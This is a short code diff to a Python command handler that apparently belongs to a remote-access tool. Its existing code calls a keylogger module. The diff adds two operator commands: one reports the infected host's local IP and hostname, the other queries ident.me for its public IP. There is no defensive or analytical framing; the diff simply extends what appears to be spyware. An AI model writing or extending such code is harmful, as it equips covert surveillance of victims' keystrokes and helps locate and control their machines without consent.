@@ -400,6 +400,17 @@ def pre_cmd(s: str, directory='', v=False):
         if not args:
             return str(keylogger.get_layout()).encode('cp866')
         return 'Wrong syntax'.encode('cp866')
+    elif cmd_name == '.get_ip':
+        if not args:
+            hostname = socket.gethostname()
+            ip = socket.gethostbyname(hostname)
+            return f'{ip} | {hostname}'.encode('cp866')
+        return 'Wrong syntax'.encode('cp866')
+    elif cmd_name == '.get_external_ip':
+        if not args:
+            ip = urllib.request.urlopen('http://ident.me').read().decode('utf8')
+            return f'{ip}'.encode('cp866')
+        return 'Wrong syntax'.encode('cp866')
     elif s[0] != '.':
         if s[0] == '?':
             msg = command(s[1:], True)
